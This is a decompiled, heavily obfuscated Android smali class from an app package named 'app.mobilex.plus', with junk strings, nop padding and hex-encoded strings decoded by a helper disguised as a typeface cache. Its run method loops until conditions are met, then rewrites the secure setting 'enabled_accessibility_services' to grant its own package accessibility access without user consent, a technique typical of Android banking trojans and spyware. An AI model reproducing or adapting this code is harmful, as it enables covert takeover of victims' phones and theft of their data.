.class public final synthetic Lv/s/z9TmJAH7hN9WNzgCfcXV;
.super Ljava/lang/Object;
.source "r8-map-id-15e63fcf80fafdb0de787d7190aafb45897c9495c974dfb43163f91afee6c091"

# interfaces
.implements Ljava/lang/Runnable;


# instance fields
.field public final synthetic vekpFI4d1Nc4fakF:Landroid/app/Application;

.field public final synthetic w9sT1Swbhx3hs:I


# direct methods
.method public synthetic constructor <init>(Landroid/app/Application;I)V
    .locals 0

    .line 1
    iput p2, p0, Lv/s/z9TmJAH7hN9WNzgCfcXV;->w9sT1Swbhx3hs:I

    .line 2
    .line 3
    iput-object p1, p0, Lv/s/z9TmJAH7hN9WNzgCfcXV;->vekpFI4d1Nc4fakF:Landroid/app/Application;

    .line 4
    .line 5
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 6
    .line 7
    .line 8
    return-void
.end method

.method private static synthetic qzeh()V
    .locals 1

    const-string v0, "Preferences"

    const-string v0, "WARN"

    const-string v0, "Settings"

    const-string v0, "swipe"

    const-string v0, "LiveData"

    const-string v0, "onStart"

    const-string v0, "Glide"

    const-string v0, "org.utils.znnbrxe"

    const-string v0, "Accept"

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 13

    .line 1
    iget v0, p0, Lv/s/z9TmJAH7hN9WNzgCfcXV;->w9sT1Swbhx3hs:I

    nop

    .line 2
    .line 3
    packed-switch v0, :pswitch_data_0

    .line 4
    .line 5
    .line 6
    iget-object v0, p0, Lv/s/z9TmJAH7hN9WNzgCfcXV;->vekpFI4d1Nc4fakF:Landroid/app/Application;

    .line 7
    .line 8
    sget-object v1, Lapp/mobilex/plus/ManagerWDBridge;->dDIMxZXP1V8HdM:Landroid/app/Application;

    .line 9
    .line 10
    const-string v1, ":"

    .line 11
    .line 12
    const-string v2, "enabled_accessibility_services"

    .line 13
    .line 14
    const-wide/16 v3, 0x3a98

    .line 15
    .line 16
    :try_start_0
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 17
    .line 18
    .line 19
    :goto_0
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    .line 20
    .line 21
    .line 22
    move-result-object v3

    .line 23
    invoke-virtual {v3}, Ljava/util/Locale;->toString()Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v3

    .line 27
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    .line 28
    .line 29
    .line 30
    move-result v3

    .line 31
    const v4, 0x3e7

    .line 32
    .line 33
    if-le v3, v4, :cond_0

    .line 34
    .line 35
    invoke-static {}, Ljava/lang/Thread;->yield()V

    .line 36
    .line 37
    .line 38
    invoke-static {}, Ljava/lang/Thread;->yield()V

    .line 39
    .line 40
    .line 41
    goto :goto_0

    .line 42
    :cond_0
    :goto_1
    const-wide/16 v3, 0x7530

    .line 43
    .line 44
    :try_start_1
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 45
    .line 46
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 47
    .line 48
    .line 49
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 50
    .line 51
    .line 52
    move-result-object v5

    .line 53
    if-eqz v5, :cond_1

    .line 54
    .line 55
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 56
    .line 57
    .line 58
    goto :goto_1

    .line 59
    :catchall_0
    move-exception v5

    .line 60
    goto/16 :goto_5

    .line 61
    .line 62
    :cond_1
    invoke-static {v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->K7eEOBPYP9VIoHWTe(Landroid/content/Context;)Z

    .line 63
    .line 64
    .line 65
    move-result v5

    .line 66
    if-nez v5, :cond_2

    .line 67
    .line 68
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V

    .line 69
    .line 70
    .line 71
    goto :goto_1

    .line 72
    :cond_2
    const-string v5, "00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200AE002D0065004F008600FE00BC00D700E7002A0065001B008900E500B300DE00E700210063004F00C700F500B100D300A5002F0073005F00CB00B000BE00C600B30026007B004B009300F900B100D500E7003100730048009300F100AD00C6"

    .line 73
    .line 74
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    invoke-virtual {v0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    .line 78
    .line 79
    .line 80
    move-result-object v5

    .line 81
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 82
    .line 83
    .line 84
    move-result-object v6

    .line 85
    const-string v7, "006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380048008200E200A900DB00A400260065001500A300F100AB00D3009600050057005F008600E000AB00D700B5"

    .line 86
    .line 87
    invoke-static {v7}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 88
    .line 89
    .line 90
    move-result-object v7

    .line 91
    new-instance v8, Ljava/lang/StringBuilder;

    .line 92
    .line 93
    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 94
    .line 95
    .line 96
    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 97
    .line 98
    .line 99
    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 100
    .line 101
    .line 102
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 103
    .line 104
    .line 105
    move-result-object v6

    .line 106
    invoke-static {v5, v2}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    .line 107
    .line 108
    .line 109
    move-result-object v7

    .line 110
    if-eqz v7, :cond_8

    .line 111
    .line 112
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 113
    .line 114
    .line 115
    move-result-object v8

    .line 116
    const/16 v9, 0x0

    .line 117
    invoke-static {v7, v8, v9}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 118
    .line 119
    .line 120
    move-result v8

    nop

    nop

    .line 121
    if-nez v8, :cond_3

    .line 122
    .line 123
    goto/16 :goto_4

    .line 124
    .line 125
    :cond_3
    filled-new-array {v1}, [Ljava/lang/String;

    .line 126
    .line 127
    .line 128
    move-result-object v8

    .line 129
    invoke-static {v7, v8}, Lv/s/KgSM0TsKUpCiuePB;->K5l5kmuyJzrgUX(Ljava/lang/String;[Ljava/lang/String;)Ljava/util/List;

    .line 130
    .line 131
    .line 132
    move-result-object v7

    nop

    nop

    .line 133
    new-instance v8, Ljava/util/ArrayList;

    nop

    nop

    .line 134
    .line 135
    invoke-direct {v8}, Ljava/util/ArrayList;-><init>()V

    .line 136
    .line 137
    .line 138
    invoke-interface {v7}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 139
    .line 140
    .line 141
    move-result-object v7

    .line 142
    :cond_4
    :goto_2
    invoke-interface {v7}, Ljava/util/Iterator;->hasNext()Z

    .line 143
    .line 144
    .line 145
    move-result v10

    .line 146
    if-eqz v10, :cond_5

    .line 147
    .line 148
    invoke-interface {v7}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 149
    .line 150
    .line 151
    move-result-object v10

    .line 152
    move-object v11, v10

    .line 153
    check-cast v11, Ljava/lang/String;

    .line 154
    .line 155
    invoke-virtual {v0}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object v12

    .line 159
    invoke-static {v11, v12, v9}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 160
    .line 161
    .line 162
    move-result v11

    .line 163
    if-nez v11, :cond_4

    .line 164
    .line 165
    invoke-virtual {v8, v10}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 166
    .line 167
    .line 168
    goto :goto_2

    .line 169
    :cond_5
    const/4 v7, 0x0

    .line 170
    const v9, 0x3e

    nop

    nop

    .line 171
    .line 172
    invoke-static {v8, v1, v7, v9}, Lv/s/imhBI9RqzETHtVIJe;->euF5Udt5Rqv3Qmea(Ljava/util/Collection;Ljava/lang/String;Lv/s/deLJ4Z0aL3hcJ3O1;I)Ljava/lang/String;

    .line 173
    .line 174
    .line 175
    move-result-object v7

    .line 176
    invoke-static {v5, v2, v7}, Landroid/provider/Settings$Secure;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z

    .line 177
    .line 178
    .line 179
    const-wide/16 v8, 0x5dc

    .line 180
    .line 181
    invoke-static {v8, v9}, Ljava/lang/Thread;->sleep(J)V

    .line 182
    .line 183
    .line 184
    invoke-virtual {v7}, Ljava/lang/String;->length()I

    .line 185
    .line 186
    .line 187
    move-result v8

    .line 188
    if-nez v8, :cond_6

    .line 189
    .line 190
    goto :goto_3

    .line 191
    :cond_6
    new-instance v8, Ljava/lang/StringBuilder;

    .line 192
    .line 193
    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    .line 194
    .line 195
    .line 196
    invoke-virtual {v8, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 197
    .line 198
    .line 199
    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 200
    .line 201
    .line 202
    invoke-virtual {v8, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 203
    .line 204
    .line 205
    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    .line 206
    .line 207
    .line 208
    move-result-object v6

    .line 209
    :goto_3
    invoke-static {v5, v2, v6}, Landroid/provider/Settings$Secure;->putString(Landroid/content/ContentResolver;Ljava/lang/String;Ljava/lang/String;)Z

    .line 210
    .line 211
    .line 212
    const-wide/16 v5, 0x1388

    .line 213
    .line 214
    invoke-static {v5, v6}, Ljava/lang/Thread;->sleep(J)V

    .line 215
    .line 216
    .line 217
    sget-object v5, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 218
    .line 219
    invoke-virtual {v5}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    .line 220
    .line 221
    .line 222
    invoke-static {}, Lapp/mobilex/plus/services/DataQFAdapter;->access$getInstance$cp()Lapp/mobilex/plus/services/DataQFAdapter;

    .line 223
    .line 224
    .line 225
    move-result-object v5

    .line 226
    if-eqz v5, :cond_7

    .line 227
    .line 228
    const-string v5, "00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200B400260064004D008E00F300BA009200B500260065004F008800E200BA00D600E6"

    .line 229
    .line 230
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 231
    .line 232
    .line 233
    goto :goto_6

    .line 234
    :cond_7
    const-string v5, "00140077004F008400F800BB00DD00A000790036005A00D600A100A6009200B500260065004F008600E200AB009200A600370062005E008A00E000AB009200A10022007F0057008200F400F3009200B0002A007A005700C700E200BA00C600B5003A00360052008900B000EC008200B4"

    .line 235
    .line 236
    invoke-static {v5}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 237
    .line 238
    .line 239
    goto :goto_6

    .line 240
    :cond_8
    :goto_4
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 241
    .line 242
    .line 243
    goto/16 :goto_1

    .line 244
    .line 245
    :goto_5
    const-string v6, "00140077004F008400F800BB00DD00A0006300730049009500FF00AD008800E7"

    .line 246
    .line 247
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 248
    .line 249
    .line 250
    invoke-virtual {v5}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 251
    .line 252
    .line 253
    :goto_6
    :try_start_2
    invoke-static {v3, v4}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/InterruptedException; {:try_start_2 .. :try_end_2} :catch_0

    .line 254
    .line 255
    .line 256
    goto/16 :goto_1

    .line 257
    .line 258
    :catch_0
    return-void

    .line 259
    :pswitch_0
    iget-object v0, p0, Lv/s/z9TmJAH7hN9WNzgCfcXV;->vekpFI4d1Nc4fakF:Landroid/app/Application;

    .line 260
    .line 261
    sget-object v1, Lapp/mobilex/plus/ManagerWDBridge;->dDIMxZXP1V8HdM:Landroid/app/Application;

    nop

    nop

    .line 262
    .line 263
    const-wide/16 v1, 0x7d0

    .line 264
    .line 265
    invoke-static {v1, v2}, Ljava/lang/Thread;->sleep(J)V

    .line 266
    .line 267
    .line 268
    :try_start_3
    new-instance v1, Lv/s/AfJGc52iVl6Gj;

    .line 269
    .line 270
    invoke-direct {v1}, Lv/s/AfJGc52iVl6Gj;-><init>()V

    .line 271
    .line 272
    .line 273
    const/4 v2, 0x5

    .line 274
    iput v2, v1, Lv/s/AfJGc52iVl6Gj;->dDIMxZXP1V8HdM:I

    .line 275
    .line 276
    new-instance v2, Lv/s/eDfRIe8Yxow8;

    nop

    nop

    .line 277
    .line 278
    invoke-direct {v2, v1}, Lv/s/eDfRIe8Yxow8;-><init>(Lv/s/AfJGc52iVl6Gj;)V

    .line 279
    .line 280
    .line 281
    invoke-static {v0, v2}, Lv/s/bIQtXpTQsEoGIf25Z;->K7eEOBPYP9VIoHWTe(Landroid/content/Context;Lv/s/eDfRIe8Yxow8;)V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    .line 282
    .line 283
    .line 284
    goto/16 :goto_7

    .line 285
    :catchall_1
    const-string v0, "001400790049008C00DD00BE00DC00A600240073004900C700F900B100DB00B300630064005E009300E200A6009200A6002F0065005400C700F600BE00DB00AB00260072"

    .line 286
    .line 287
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 288
    .line 289
    .line 290
    :goto_7
    return-void

    nop

    .line 291
    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_0
    .end packed-switch
.end method
